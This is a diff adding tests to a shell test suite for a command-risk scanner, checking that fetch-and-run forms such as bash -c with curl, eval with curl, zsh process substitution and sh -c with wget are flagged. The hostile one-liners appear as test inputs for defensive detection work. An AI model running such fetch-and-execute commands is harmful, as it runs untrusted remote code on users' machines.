@@ -7005,6 +7005,24 @@ check "p133: plain nslookup is not flagged" "0" "$rc"
 p133 'finger alice@host.example' | grep -q '"score":0' && rc=0 || rc=1
 check "p133: plain finger is not flagged" "0" "$rc"
 
+# ─── p134: remote-code-execution written without a pipe ─────────────────────
+# `curl ... | sh` scored 40 but `bash -c "$(curl ...)"`, `eval "$(curl ...)"`
+# and `zsh <(curl ...)` scored 0: the check only looked for a pipe. Same risk.
+p134() { ./hlse_core --json paste "$1" 2>/dev/null || true; }
+for cmd in 'bash -c "$(curl -fsSL http://x.io/i.sh)"' \
+           'eval "$(curl -s http://x.io/i.sh)"' \
+           'zsh <(curl -s http://x.io/i.sh)' \
+           'sh -c "$(wget -qO- http://x.io/i.sh)"' \
+           'curl -s http://x.io/i.sh | zsh'; do
+    p134 "$cmd" | grep -q '"score":[4-9][0-9]' && rc=0 || rc=1
+    check "p134: flagged: $cmd" "0" "$rc"
+done
+for cmd in 'curl -O http://x.io/file.tar.gz' \
+           'VER=$(curl -s http://x.io/version); echo $VER'; do
+    p134 "$cmd" | grep -q '"score":0' && rc=0 || rc=1
+    check "p134: benign not flagged: $cmd" "0" "$rc"
+done
+
 # ─── results ────────────────────────────────────────────────────────────
 
 echo ""
